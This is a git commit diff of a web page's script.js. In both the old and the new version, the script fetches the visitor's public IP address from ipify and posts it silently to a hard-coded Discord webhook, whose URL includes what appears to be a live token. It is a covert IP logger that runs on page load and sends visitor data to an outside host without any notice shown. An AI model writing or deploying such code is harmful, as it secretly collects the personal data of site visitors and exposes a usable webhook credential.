0e15a040d22fbd52e89697b0cc2b08fb5e628f7e
RafinYo <mijanulislamrafinha@gmail.com>
2024-11-20 19:56:22 +0600

    Update script.js

--- script.js
+++ script.js
@@ -1,12 +1,12 @@
-function sendIP(ip) {
-  const xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://discord.com/api/webhooks/1308788964949229628/QpmD5-9kA16LG8AduZ4y4I8cWMub3bo7JORXQvj1f6QAUG33tejSx2mtH2Ke_dF-KAEg", true);
-  xhr.setRequestHeader("Content-Type", "application/json");
-  xhr.send(JSON.stringify({ ip }));
-}
+const webhookUrl = 'https://discord.com/api/webhooks/1308788964949229628/QpmD5-9kA16LG8AduZ4y4I8cWMub3bo7JORXQvj1f6QAUG33tejSx2mtH2Ke_dF-KAEg';
+const xhr = new XMLHttpRequest();
+xhr.open('POST', webhookUrl, true);
+xhr.setRequestHeader('Content-Type', 'application/json');
 
-fetch("https://api.ipify.org?format=json")
+fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
-    sendIP(data.ip);
+    const ip = data.ip;
+    const payload = { content: `IP: ${ip}` };
+    xhr.send(JSON.stringify(payload));
   });
